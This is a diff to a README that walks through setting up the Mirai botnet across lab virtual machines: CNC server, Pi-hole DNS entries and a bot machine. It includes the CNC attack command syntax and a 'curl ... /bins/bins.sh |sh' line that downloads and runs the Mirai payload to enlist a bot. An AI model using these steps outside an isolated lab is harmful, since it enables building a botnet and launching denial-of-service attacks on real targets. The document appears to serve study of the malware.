@@ -155,7 +155,8 @@ sudo systemctl restart mysql
 **Simply run and type in your domain and dns server:**
 ```
 python3 setup.py
-```
+``` 
+
 1. Put in some dummy domain for ex: www.mirai.com as shown below
 <br>![py_1](https://github.com/LohithCV/mirai-setup/assets/125025760/ebc2c112-11d6-4ddc-b6fe-73cc4a481a20)<br><br>
 2. Put in the same domain as the step-1 for scanner domain as well
@@ -168,6 +169,8 @@ python3 setup.py
 <br>![py_5](https://github.com/LohithCV/mirai-setup/assets/125025760/3556d88d-4612-4a13-adc6-aa645109b100)<br><br>
 
 **Now change the DNS resolver of this machine to the local DNS server's IP**.<br>
+<br> **Note: Add the above entered domain and the IP address of the CNC server in the local DNS server machine in the web interface of Pi-Hole. Don't forget to click Add.**<br>
+<img alt="dns" src="https://github.com/LohithCV/mirai-setup/assets/125025760/8f805f1e-0d9f-457f-8062-95ebad72e560" width="600"/><br><br>
 **Run this command to change the DNS IP:**
 
 ```
@@ -223,6 +226,12 @@ Type in the web server IP as the IP of CNC server on the internal network interf
 
 **Now the CNC is complelety set**
 
+**To perform an attack enter the following in the attackers terminal**
+
+```
+<attack_type> <target_ip> <duration_in_seconds>
+```
+
 ## Virtual Machine - 3 Bot
 
 To load mirai on to this you just need to curl the CNC server:
@@ -232,4 +241,7 @@ curl http://<web_server_ip>/bins/bins.sh |sh
 ```
 <br>
 
+
 After this you can see that in the attackers terminal the bot count would have increased by 1.
+
+<img alt="bot" src="https://github.com/LohithCV/mirai-setup/assets/125025760/419ecb69-d666-4c09-828d-91f98a3d3496" width="400"/>
